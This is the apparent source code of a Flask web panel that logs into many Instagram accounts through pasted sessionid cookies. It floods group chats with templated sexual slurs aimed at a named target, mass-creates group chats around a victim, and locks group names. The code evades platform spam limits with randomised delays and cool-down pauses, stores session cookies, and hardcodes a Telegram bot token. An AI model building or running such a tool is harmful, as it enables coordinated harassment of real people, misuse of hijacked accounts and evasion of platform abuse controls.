from flask import Flask, render_template_string, request, redirect, url_for, session, send_file, jsonify
import threading
import os
import json
import random
from itertools import cycle
from instagrapi import Client
import requests
import sqlite3
import time
import re
import urllib.parse
import secrets
from datetime import datetime
from pyngrok import ngrok  

app = Flask(__name__)
app.secret_key = "SNAPPY_KEY_ULTIMATE_SECURE"

active_spam_threads = {}
lock_name_threads = {}
live_logs = []
app_start_time = time.time()
account_stats = {}
campaign_info = {}
dynamic_targets = {}
node_quarantine_status = {}

ADMIN_TG_BOT_TOKEN = "8797760883:AAGk050hX-7IK26deFOfR3e0Gu8KtbtqLC0"
ADMIN_TG_CHAT_ID = "7420788495"

# ================= SESSION HELPER (FIXED) =================
def get_session_file(username):
    os.makedirs("sessions", exist_ok=True)
    return f"sessions/{username}.pkl"

def clean_session_id(session_id):
    """Clean session ID properly"""
    try:
        sid = session_id.strip()
        if '%3A' in sid or '%' in sid:
            sid = urllib.parse.unquote(sid)
        sid = ''.join(c for c in sid if c.isprintable())
        if isinstance(sid, bytes):
            sid = sid.decode('utf-8', errors='ignore')
        return sid
    except:
        return session_id.strip()

def login_with_session(session_id, username):
    """🔥 FIXED: Proper session handling with instagrapi"""
    cl = Client()
    session_file = get_session_file(username)
    
    # Try loading saved session first
    if os.path.exists(session_file):
        try:
            with open(session_file, 'rb') as f:
                cl.load_settings(f.read())
            cl.login(username, "")
            print(f"✅ [{username}] Session loaded from file!")
            return cl
        except Exception as e:
            print(f"⚠️ [{username}] Saved session failed: {e}")
    
    # Login with session ID
    try:
        sid = clean_session_id(session_id)
        print(f"🔍 Cleaned SID: {sid[:30]}...")
        
        # Method 1: Try login_by_sessionid
        try:
            cl.login_by_sessionid(sid)
            print(f"✅ [{username}] Logged in with session ID!")
            with open(session_file, 'wb') as f:
                f.write(cl.get_settings())
            return cl
        except Exception as e1:
            print(f"⚠️ Session ID login failed: {e1}")
            
            # Method 2: Try with different user agent
            try:
                cl.set_user_agent("Instagram 269.0.0.18.96 Android")
                cl.login_by_sessionid(sid)
                with open(session_file, 'wb') as f:
                    f.write(cl.get_settings())
                return cl
            except Exception as e2:
                print(f"⚠️ Cookie login failed: {e2}")
                
                # Method 3: Try with cookies
                try:
                    cl.set_user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                    cl.login_by_sessionid(sid)
                    with open(session_file, 'wb') as f:
                        f.write(cl.get_settings())
                    return cl
                except Exception as e3:
                    raise Exception(f"All login methods failed: {str(e3)[:50]}")
                
    except Exception as e:
        print(f"❌ [{username}] Login failed: {e}")
        raise e

def refresh_session(cl, username):
    """🔄 FIXED: Safe session refresh without JSONDecodeError"""
    try:
        if cl is None:
            return None
            
        # Check if session is still valid
        try:
            cl.get_user_id(cl.username)
            print(f"✅ [{username}] Session is valid")
            return cl
        except Exception as e:
            print(f"⚠️ [{username}] Session expired: {e}")
            
            # Try to reload from file
            session_file = get_session_file(username)
            if os.path.exists(session_file):
                try:
                    # Create new client and load settings
                    new_cl = Client()
                    with open(session_file, 'rb') as f:
                        new_cl.load_settings(f.read())
                    new_cl.login(username, "")
                    print(f"🔄 [{username}] Session refreshed from file!")
                    return new_cl
                except Exception as e2:
                    print(f"❌ [{username}] Refresh failed: {e2}")
                    return None
            else:
                print(f"❌ [{username}] No session file found")
                return None
    except Exception as e:
        print(f"⚠️ Session refresh error: {e}")
        return None

# ================= DATABASE =================
def init_db():
    conn = sqlite3.connect('panel_users.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE,
            full_name TEXT,
            followers INTEGER,
            following INTEGER,
            session_id TEXT,
            ip_address TEXT,
            device TEXT,
            added_at TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

# ================= SPAM LISTS =================
SIREN_LIST_1 = [
    "𝗔𝗡𝗧𝗘𝗥 𝗠𝗔𝗡𝗧𝗘𝗥 𝗦𝗛𝗘𝗧𝗔𝗡𝗜 𝗞𝗛𝗢𝗣𝗗𝗔 < {target}> 𝗧𝗘𝗥𝗜 𝗠𝗔𝗔 𝗞𝗔 𝗕𝗛𝗢𝗦𝗗𝗔 🪼⋆｡𖦹°🫧⋆.ೃ࿔*:･",
    "𝗠𝗔𝗜 𝗣𝗜𝗧𝗔 𝗛𝗨𝗡 𝗣𝗔𝗡𝗜 < {target}> 𝗞𝗜 𝗠𝗔𝗔 𝗥𝗔𝗡𝗗𝗜𝗢𝗡 𝗞𝗜 𝗥𝗔𝗡𝗜 ˖°𓇼🌊⋆🐚🫧",
    "< {target} > 𝗢𝗬𝗘 𝗧𝗘𝗥𝗜 𝗥𝗔𝗡𝗗𝗜 𝗠𝗔𝗔 𝗞𝗢 𝗛𝗔𝗞𝗟𝗔 𝗞𝗘 𝗖𝗛𝗢𝗗𝗨 ‧₊˚🖇️✩ ₊˚🎧⊹♡",
    "𝗔𝗖𝗛𝗔 𝗦𝗨𝗡 𝗧𝗢 < {target}> 𝗧𝗘𝗥𝗜 𝗠𝗔𝗔 𝗞𝗢 𝗕𝗛𝗔𝗚𝗔 𝗕𝗛𝗔𝗚𝗔 𝗖𝗛𝗢𝗗𝗨 ‧₊˚ ☁️⋅♡🪐༘⋆",
    "< {target} > 𝗧𝗘𝗥𝗜 𝗕𝗛𝗘𝗡 𝗞𝗜 𝗧𝗔𝗡𝗚 𝗨𝗧𝗛𝗔 𝗞𝗘 𝗜𝗗𝗛𝗘𝗥 𝗨𝗗𝗛𝗘𝗥 𝗖𝗛𝗢𝗗𝗨𝗡𝗚𝗔 ༘⋆🌷🫧💭₊˚ෆ",
    "< {target} > -----𝗞𝗨𝗧𝗧𝗜𝗬𝗔 𝗕𝗔𝗡𝗔 𝗞𝗜 𝗖𝗢𝗗𝗨 𝗧𝗘𝗥𝗜 𝗠𝗔𝗔 𝗞𝗢 🧉❀🐚🐉︎ ࿔*:･ﾟ☾"
]

SIREN_LIST_2 = [
    "< {target} >    Ƭᴇʀɪ Mᴀᴀ Ƙᴀ Ɓʜᴏsᴅᴀ??\n\n< {target} >    Ƭᴇʀɪ Mᴀᴀ Ƙᴀ Ɓʜᴏsᴅᴀ??\n\n< {target} >    Ƭᴇʀɪ Mᴀᴀ Ƙᴀ Ɓʜᴏsᴅᴀ??\n\n< {target} >    Ƭᴇʀɪ Mᴀᴀ Ƙᴀ Ɓʜᴏsᴅᴀ??\n\n< {target} >    Ƭᴇʀɪ Mᴀᴀ Ƙᴀ Ɓʜᴏsᴅᴀ??\n\n< {target} >    Ƭᴇʀɪ Mᴀᴀ Ƙᴀ Ɓʜᴏsᴅᴀ??\n\n< {target} >    Ƭᴇʀɪ Mᴀᴀ Ƙᴀ Ɓʜᴏsᴅᴀ??\n\n< {target} >    Ƭᴇʀɪ Mᴀᴀ Ƙᴀ Ɓʜᴏsᴅᴀ??\n\n< {target} >    Ƭᴇʀɪ Mᴀᴀ Ƙᴀ Ɓʜᴏsᴅᴀ??\n\n< {target} >    Ƭᴇʀɪ Mᴀᴀ Ƙᴀ Ɓʜᴏsᴅᴀ??\n\n< {target} >    Ƭᴇʀɪ Mᴀᴀ Ƙᴀ Ɓʜᴏsᴅᴀ??\n\n< {target} >    Ƭᴇʀɪ Mᴀᴀ Ƙᴀ Ɓʜᴏsᴅᴀ??"
]

SIREN_LIST_3 = [
    "( {target} )-----------𝑷𝑹 𝑻𝑬𝑹𝑰 𝑴𝑨𝑨 𝑪𝑯𝑼𝑫𝑵𝑬 𝑲𝑰𝑼 𝑳𝑨𝑮 𝑮𝑨𝑰 <🙄🔥>★⁜⁕↬↬⁜₰⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁⌁🎀🎧( {target} )-----------𝑷𝑹 𝑻𝑬𝑹𝑰 𝑴𝑨𝑨 𝑪𝑯𝑼𝑫𝑵𝑬 𝑲𝑰𝑼 𝑳𝑨𝑮 𝑮𝑨𝑰 <🙄🔥>"
]

SIREN_LIST_4 = [
    "𝑨𝒏𝒕𝒔 𝑰𝒏 𝒀𝒐𝒖𝒓 𝑨𝒔𝒔🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･🐊⋆｡𖦹°🫧⋆.ೃ࿔*:･⏔⏔⏔ ꒰ {target} ꒱ ⏔⏔⏔"
]

# ================= TELEGRAM ALERT =================
def send_telegram_alert(message):
    try:
        if ADMIN_TG_BOT_TOKEN != "YOUR_TELEGRAM_BOT_TOKEN_HERE":
            url = f"https://api.telegram.org/bot{ADMIN_TG_BOT_TOKEN}/sendMessage"
            payload = {"chat_id": ADMIN_TG_CHAT_ID, "text": message, "parse_mode": "Markdown"}
            requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Telegram alert error: {e}")

def log_event(message, level="info"):
    timestamp = datetime.now().strftime("%H:%M:%S")
    log_entry = {"time": timestamp, "msg": message, "level": level}
    live_logs.insert(0, log_entry)
    if len(live_logs) > 300:
        live_logs.pop()

# ================= RESOLVE THREAD ID =================
def resolve_thread_id(cl, raw_input):
    raw_input = raw_input.strip()
    match = re.search(r'(\d{15,})', raw_input)
    if match:
        return match.group(1)
    return raw_input

# ================= NAME LOCK WORKER =================
def run_name_lock_worker(session_id, raw_gc_input, desired_name, module_key, uname):
    log_event(f"[{uname}] NC Lock active. Enforcing group name: '{desired_name}'", "success")
    while lock_name_threads.get(module_key, False):
        try:
            cl = login_with_session(session_id, uname)
            thread_id = resolve_thread_id(cl, raw_gc_input)
            
            while lock_name_threads.get(module_key, False):
                try:
                    threads = cl.direct_threads(amount=20)
                    target_thread = None
                    for t in threads:
                        t_id = str(getattr(t, 'id', None) or getattr(t, 'pk', None))
                        if t_id == str(thread_id):
                            target_thread = t
                            break
                    
                    if target_thread:
                        current_title = getattr(target_thread, 'title', '')
                        if current_title != desired_name:
                            cl.direct_thread_update_title(thread_id, desired_name)
                            log_event(f"[{uname}] NC Lock: Name reverted to '{desired_name}'!", "warning")
                    
                    time.sleep(10)
                except Exception as inner_ex:
                    time.sleep(5)
        except Exception as e:
            log_event(f"[{uname}] NC Lock Reconnecting...", "error")
            time.sleep(10)

# ================= SPAM WORKER (FIXED) =================
def run_spam_worker(session_id, initial_target, custom_texts_list, template_list, target_scope, target_gc_input, custom_delay, module_key, uname):
    message_cycle = cycle(custom_texts_list if custom_texts_list else template_list)
    if uname not in account_stats:
        account_stats[uname] = {"sent": 0, "failed": 0, "gcs_count": 0, "target": initial_target, "active": True}
    
    dynamic_targets[uname] = initial_target
    campaign_info[uname] = {"target": initial_target, "active": True, "start_time": time.time()}

    cl = None
    reconnect_attempts = 0
    max_attempts = 5

    while active_spam_threads.get(module_key, False):
        if node_quarantine_status.get(uname, False):
            time.sleep(5)
            continue

        try:
            # 🔥 FIXED: Better session handling
            if cl is None:
                cl = login_with_session(session_id, uname)
                if cl is None:
                    reconnect_attempts += 1
                    if reconnect_attempts > max_attempts:
                        log_event(f"[{uname}] Max reconnect attempts reached", "error")
                        break
                    log_event(f"[{uname}] Reconnecting... ({reconnect_attempts}/{max_attempts})", "warning")
                    time.sleep(10)
                    continue
                reconnect_attempts = 0
            
            # Check session validity
            try:
                cl.get_user_id(cl.username)
            except Exception as e:
                log_event(f"[{uname}] Session invalid: {str(e)[:30]}", "warning")
                cl = None
                time.sleep(5)
                continue
            
            log_event(f"[{uname}] Authenticated & Ready", "success")
            
            # Fetch threads
            try:
                threads = cl.direct_threads(amount=99999)
                all_gc_ids = []
                for t in threads:
                    t_id = getattr(t, 'id', None) or getattr(t, 'pk', None)
                    if t_id:
                        all_gc_ids.append(str(t_id))
                        
                with open("link.txt", "w", encoding="utf-8") as f:
                    for t in threads:
                        t_id = getattr(t, 'id', None) or getattr(t, 'pk', None)
                        f.write(f"ID: {t_id} | Title: {getattr(t, 'title', 'No Title')}\n")
                
                if target_scope == "single":
                    resolved_gc = resolve_thread_id(cl, target_gc_input)
                    target_threads = [resolved_gc] if resolved_gc else all_gc_ids
                    account_stats[uname]["gcs_count"] = 1
                else:
                    target_threads = all_gc_ids
                    account_stats[uname]["gcs_count"] = len(all_gc_ids)
                    
                if not target_threads:
                    log_event(f"[{uname}] No threads found", "warning")
                    time.sleep(10)
                    continue

            except Exception as e:
                log_event(f"[{uname}] Thread fetch error: {str(e)[:30]}", "error")
                cl = None
                time.sleep(10)
                continue

            consecutive_errors = 0
            while active_spam_threads.get(module_key, False):
                if node_quarantine_status.get(uname, False):
                    break

                try:
                    if not target_threads:
                        log_event(f"[{uname}] No GCs detected", "warning")
                        time.sleep(3)
                        break
                    
                    current_target = dynamic_targets.get(uname, initial_target)
                    campaign_info[uname]["target"] = current_target
                    account_stats[uname]["target"] = current_target

                    for thread_id in target_threads:
                        if not active_spam_threads.get(module_key, False) or node_quarantine_status.get(uname, False):
                            break
                        
                        raw_text = next(message_cycle)
                        message = raw_text.replace("{target}", current_target)
                        
                        try:
                            cl.direct_send(message, thread_ids=[thread_id])
                            account_stats[uname]["sent"] += 1
                            consecutive_errors = 0
                            log_event(f"[{uname}] SENT ➔ {current_target}", "success")
                            
                            base_wait = max(float(custom_delay), 2.0)
                            jitter_sleep = base_wait + random.uniform(0.8, 3.5)
                            time.sleep(jitter_sleep)

                        except Exception as ex:
                            account_stats[uname]["failed"] += 1
                            consecutive_errors += 1
                            err_msg = str(ex)
                            
                            if "block" in err_msg.lower() or "limit" in err_msg.lower() or "item_ack" in err_msg.lower():
                                log_event(f"[{uname}] SPAM DETECTED! Quarantine 60s", "error")
                                
                                node_quarantine_status[uname] = True
                                def release_quarantine(u):
                                    time.sleep(60)
                                    node_quarantine_status[u] = False
                                    log_event(f"[{u}] Quarantine finished!", "success")
                                
                                q_thread = threading.Thread(target=release_quarantine, args=(uname,))
                                q_thread.daemon = True
                                q_thread.start()
                                break
                            elif "login" in err_msg.lower() or "auth" in err_msg.lower():
                                log_event(f"[{uname}] Session expired, reconnecting", "error")
                                cl = None
                                break
                            else:
                                log_event(f"[{uname}] Error: {err_msg[:35]}", "error")
                            
                            if consecutive_errors > 4:
                                log_event(f"[{uname}] Cooling node for 15s", "warning")
                                time.sleep(15)
                                consecutive_errors = 0
                    
                    time.sleep(2)
                except Exception as inner_e:
                    log_event(f"[{uname}] Glitch: {str(inner_e)[:30]}", "warning")
                    time.sleep(3)
        except Exception as e:
            log_event(f"[{uname}] Worker error: {str(e)[:30]}", "error")
            cl = None
            time.sleep(10)
    
    if uname in campaign_info:
        campaign_info[uname]["active"] = False

# ================= HTML TEMPLATES =================
LAYOUT_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SNAPPY CLAN // Control Console</title>
    <style>
        :root {
            --bg-base: #0b0f19;
            --panel-bg: #111827;
            --border-color: #1f2937;
            --accent-primary: #3b82f6;
            --accent-success: #10b981;
            --accent-warning: #f59e0b;
            --accent-danger: #ef4444;
            --text-main: #f9fafb;
            --text-muted: #9ca3af;
        }
        * { box-sizing: border-box; }
        body {
            background-color: var(--bg-base);
            color: var(--text-main);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            margin: 0; padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        .header {
            display: flex; justify-content: space-between; align-items: center;
            border-bottom: 1px solid var(--border-color); padding-bottom: 15px; margin-bottom: 20px;
        }
        .header h1 { font-size: 16px; font-weight: 600; color: var(--text-main); margin: 0; }
        .nav-tabs { display: flex; gap: 8px; margin-bottom: 20px; }
        .nav-tabs a {
            background: var(--panel-bg); border: 1px solid var(--border-color); color: var(--text-muted);
            padding: 8px 16px; border-radius: 6px; text-decoration: none; font-size: 12px; font-weight: 500;
        }
        .nav-tabs a.active { background: var(--accent-primary); color: #fff; border-color: var(--accent-primary); }
        .card {
            background: var(--panel-bg); border: 1px solid var(--border-color); border-radius: 10px;
            padding: 20px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); margin-bottom: 20px;
        }
        .card-title { font-size: 13px; font-weight: 600; color: var(--text-main); text-transform: uppercase; border-bottom: 1px solid var(--border-color); padding-bottom: 10px; margin-bottom: 15px; }
        .form-group { margin-bottom: 14px; }
        label { display: block; font-size: 11px; font-weight: 500; color: var(--text-muted); margin-bottom: 6px; }
        input, select, textarea {
            width: 100%; padding: 10px 12px; background: #0d1117; border: 1px solid var(--border-color);
            color: var(--text-main); border-radius: 6px; font-size: 13px; outline: none;
        }
        input:focus, select:focus, textarea:focus { border-color: var(--accent-primary); }
        textarea { height: 80px; resize: vertical; }
        .checkbox-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; background: #0d1117; padding: 10px; border-radius: 6px; border: 1px solid var(--border-color); }
        .checkbox-item { display: flex; align-items: center; gap: 8px; font-size: 12px; cursor: pointer; }
        .btn {
            width: 100%; padding: 10px; background: var(--accent-primary); border: none; color: #fff;
            font-weight: 600; border-radius: 6px; cursor: pointer; font-size: 12px; margin-top: 5px;
        }
        .btn-warning { background: var(--accent-warning); color: #111827; }
        .btn-danger { background: var(--accent-danger); color: #fff; }
        .terminal {
            background: #0d1117; border: 1px solid var(--border-color); border-radius: 8px;
            height: 460px; overflow-y: auto; padding: 14px; font-size: 12px; font-family: monospace; display: flex; flex-direction: column-reverse;
        }
        .log-line { margin-bottom: 6px; }
        .success { color: var(--accent-success); }
        .error { color: var(--accent-danger); }
        .warning { color: var(--accent-warning); }
        .info { color: var(--accent-primary); }
        .grid-2 { display: grid; grid-template-columns: 420px 1fr; gap: 20px; }
        @media(max-width: 900px) { .grid-2 { grid-template-columns: 1fr; } }
    </style>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>SNAPPY PANEL &mdash; Operator: {{ session.get('operator_name', 'ELITE') }}</h1>
        <div style="font-size: 12px; color: var(--text-muted);">Uptime: <span id="uptime">0h 0m 0s</span></div>
    </div>

    <div class="nav-tabs">
        <a href="/" class="{% if active_tab == 'dashboard' %}active{% endif %}">Dashboard</a>
        <a href="/ids_status" class="{% if active_tab == 'ids' %}active{% endif %}">Nodes Matrix</a>
    </div>

    {% if message %}
        <div style="padding: 12px; margin-bottom: 18px; border-radius: 6px; font-size: 12px; font-weight: 500; background: rgba(16, 185, 129, 0.1); border: 1px solid var(--accent-success); color: var(--accent-success);">
            {{ message }}
        </div>
    {% endif %}

    {% block content %}{% endblock %}
</div>

<script>
    let startTime = Math.floor(Date.now() / 1000) - {{ uptime_seconds }};
    function updateUptime() {
        let now = Math.floor(Date.now() / 1000);
        let diff = now - startTime;
        let h = Math.floor(diff / 3600);
        let m = Math.floor((diff % 3600) / 60);
        let s = diff % 60;
        document.getElementById('uptime').innerText = h + "h " + m + "m " + s + "s";
    }
    setInterval(updateUptime, 1000);
</script>
</body>
</html>
"""

DASHBOARD_HTML = """
{% extends "layout" %}
{% block content %}
<div class="grid-2">
    <div>
        <div class="card">
            <div class="card-title">Add Node Account</div>
            <form method="POST">
                <input type="hidden" name="action_type" value="add_session">
                <div class="form-group">
                    <label>Session ID Cookie</label>
                    <input type="text" name="new_session_id" placeholder="Paste sessionid cookie..." required>
                </div>
                <button type="submit" class="btn">Authorize Node</button>
            </form>
        </div>

        <div class="card" style="border-color: var(--accent-success);">
            <div class="card-title" style="color: var(--accent-success);">⚡ Live Target Dynamic Switcher</div>
            <form method="POST">
                <input type="hidden" name="action_type" value="update_live_target">
                <div class="form-group">
                    <label>New Target Name / Identity</label>
                    <input type="text" name="new_target_name" placeholder="New target name..." required>
                </div>
                <button type="submit" class="btn" style="background: var(--accent-success); color: #000;">Update Active Target Instantly</button>
            </form>
        </div>

        <div class="card">
            <div class="card-title">Group Name Lock (NC Lock)</div>
            <form method="POST">
                <input type="hidden" name="action_type" value="start_nc_lock">
                <div class="form-group">
                    <label>Target Group ID / Link</label>
                    <input type="text" name="lock_gc_input" placeholder="Thread ID..." required>
                </div>
                <div class="form-group">
                    <label>Locked Group Name</label>
                    <input type="text" name="locked_name" placeholder="SECURE GROUP" required>
                </div>
                <button type="submit" class="btn btn-warning">Enable NC Lock</button>
            </form>
            <form method="POST" style="margin-top: 8px;">
                <input type="hidden" name="action_type" value="stop_nc_lock">
                <button type="submit" class="btn btn-danger" style="padding: 6px; font-size: 11px;">Disable NC Lock</button>
            </form>
        </div>

        <div class="card">
            <div class="card-title">Mass GC Creator (Sequential)</div>
            <form method="POST">
                <input type="hidden" name="action_type" value="mass_create_gc">
                <div class="form-group">
                    <label>Base Prefix</label>
                    <input type="text" name="gc_prefix" placeholder="Raid" required>
                </div>
                <div class="form-group">
                    <label>Target Username</label>
                    <input type="text" name="target_user" placeholder="username (no @)" required>
                </div>
                <div class="form-group">
                    <label>Count</label>
                    <input type="number" name="gc_count" placeholder="20" min="1" max="9999" required>
                </div>
                <button type="submit" class="btn btn-warning">Create GCs</button>
            </form>
        </div>

        <div class="card">
            <div class="card-title">Advanced Multi-Node Router & Flood</div>
            <form method="POST">
                <input type="hidden" name="action_type" value="start_spam">
                
                <div class="form-group">
                    <label>Select Specific Nodes (Check to include)</label>
                    <div class="checkbox-grid">
                        {% if all_nodes %}
                            {% for node in all_nodes %}
                                <label class="checkbox-item">
                                    <input type="checkbox" name="selected_nodes" value="{{ node[1] }}" checked> @{{ node[1] }}
                                </label>
                            {% endfor %}
                        {% else %}
                            <span style="font-size: 11px; color: var(--text-muted);">No nodes registered.</span>
                        {% endif %}
                    </div>
                </div>

                <div class="form-group">
                    <label>Target Identity</label>
                    <input type="text" name="target_name" placeholder="Target Name" required>
                </div>

                <div class="form-group">
                    <label>Routing Scope</label>
                    <select name="target_scope">
                        <option value="all">All Group Chats (Matrix Wide)</option>
                        <option value="single">Single Target GC (ID / Link)</option>
                    </select>
                </div>

                <div class="form-group">
                    <label>Single GC ID (If Single Scope Selected)</label>
                    <input type="text" name="single_gc_input" placeholder="Thread ID...">
                </div>

                <div class="form-group">
                    <label>Per-Node Base Speed / Delay (Seconds)</label>
                    <input type="number" step="any" name="custom_delay" value="3.5" min="2.0" required>
                </div>

                <div class="form-group">
                    <label>Payload Template</label>
                    <select name="spam_option">
                        <option value="opt1">Template 1</option>
                        <option value="opt2">Template 2</option>
                        <option value="opt3">Template 3</option>
                        <option value="opt4">Template 4</option>
                        <option value="opt_custom">Custom Payload</option>
                    </select>
                </div>

                <div class="form-group">
                    <label>Custom Lines (Use {target})</label>
                    <textarea name="custom_text" placeholder="Line 1 for {target}&#10;Line 2 for {target}"></textarea>
                </div>

                <button type="submit" class="btn">Launch Routed Campaign</button>
            </form>

            <form method="POST" style="margin-top: 10px;">
                <input type="hidden" name="action_type" value="stop_spam">
                <button type="submit" class="btn btn-danger">Stop All Active</button>
            </form>

            <form method="POST" action="/" style="margin-top: 8px;">
                <input type="hidden" name="action_type" value="get_links">
                <button type="submit" class="btn" style="background: #374151; color: #fff;">Download link.txt</button>
            </form>
        </div>
    </div>

    <div>
        <div class="card">
            <div class="card-title">Live Telemetry Logs</div>
            <div id="terminal" class="terminal">
                <div class="log-line info">[System] Console ready and operational.</div>
            </div>
        </div>
    </div>
</div>

<script>
    function updateTelemetry() {
        fetch('/get_logs')
            .then(res => res.json())
            .then(data => {
                let terminal = document.getElementById('terminal');
                let html = '';
                data.logs.forEach(log => {
                    let cls = 'info';
                    if(log.level === 'success') cls = 'success';
                    if(log.level === 'error') cls = 'error';
                    if(log.level === 'warning') cls = 'warning';
                    html += `<div class="log-line ${cls}">[${log.time}] ${log.msg}</div>`;
                });
                terminal.innerHTML = html;
            });
    }
    setInterval(updateTelemetry, 1500);
</script>
{% endblock %}
"""

IDS_STATUS_HTML = """
{% extends "layout" %}
{% block content %}
<div class="card">
    <div class="card-title">Nodes & Campaign Matrix</div>
    <div style="font-size: 12px; color: var(--text-muted); margin-bottom: 15px;">
        Linked Nodes: <b style="color: var(--accent-success);">{{ accounts|length }}</b>
    </div>

    <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px;">
        {% if card_data %}
            {% for item in card_data %}
                <div style="background: #0d1117; border: 1px solid var(--border-color); border-radius: 8px; padding: 15px;">
                    <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-color); padding-bottom: 8px; margin-bottom: 10px;">
                        <span style="font-weight: 600; color: var(--text-main); font-size: 12px;">{{ item.target_name }}</span>
                        <span style="background: rgba(16, 185, 129, 0.1); border: 1px solid var(--accent-success); color: var(--accent-success); padding: 2px 6px; font-size: 10px; border-radius: 4px;">ACTIVE</span>
                    </div>
                    
                    <div style="font-size: 11px; margin-bottom: 10px; color: var(--text-muted);">
                        Node: @{{ item.username }} | Followers: {{ item.followers }}
                    </div>

                    <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 6px; text-align: center; background: var(--bg-base); padding: 8px; border-radius: 6px; border: 1px solid var(--border-color); margin-bottom: 12px;">
                        <div>
                            <span style="font-size: 9px; color: var(--text-muted);">SENT</span>
                            <strong style="font-size: 13px; color: var(--accent-success);">{{ item.sent }}</strong>
                        </div>
                        <div>
                            <span style="font-size: 9px; color: var(--text-muted);">FAILED</span>
                            <strong style="font-size: 13px; color: var(--accent-danger);">{{ item.failed }}</strong>
                        </div>
                        <div>
                            <span style="font-size: 9px; color: var(--text-muted);">GCS</span>
                            <strong style="font-size: 13px; color: var(--accent-primary);">{{ item.gcs_count }}</strong>
                        </div>
                    </div>

                    <a href="/remove_session/{{ item.id }}" style="display:block; text-align:center; background:var(--accent-danger); color:#fff; padding:6px; border-radius:4px; text-decoration:none; font-size:11px; font-weight:500;">Disconnect Node</a>
                </div>
            {% endfor %}
        {% else %}
            <div style="font-size: 12px; color: var(--text-muted); padding: 20px; text-align: center;">No active campaigns or nodes found.</div>
        {% endif %}
    </div>
</div>
{% endblock %}
"""

SETUP_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SNAPPY CLAN - Login</title>
    <style>
        :root {
            --bg-base: #0b0f19;
            --panel-bg: #111827;
            --border-color: #1f2937;
            --accent-primary: #3b82f6;
            --text-main: #f9fafb;
            --text-muted: #9ca3af;
        }
        body { background-color: var(--bg-base); color: var(--text-main); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .setup-card { background: var(--panel-bg); border: 1px solid var(--border-color); border-radius: 10px; padding: 25px; width: 360px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1); }
        h1 { font-size: 14px; font-weight: 600; color: var(--text-main); margin-bottom: 20px; text-align: center; }
        input { width: 100%; padding: 10px 12px; background: #0d1117; border: 1px solid var(--border-color); color: var(--text-main); border-radius: 6px; font-size: 13px; outline: none; margin-bottom: 15px; }
        .btn { width: 100%; padding: 10px; background: var(--accent-primary); border: none; color: #fff; font-weight: 600; border-radius: 6px; cursor: pointer; font-size: 12px; }
    </style>
</head>
<body>
<div class="setup-card">
    <h1>Operator Authentication</h1>
    <form method="POST">
        <label style="display:block; font-size:11px; font-weight:500; color:var(--text-muted); margin-bottom:6px;">Operator Handle</label>
        <input type="text" name="operator_name" placeholder="Name..." required autocomplete="off">
        <button type="submit" class="btn">Sign In</button>
    </form>
</div>
</body>
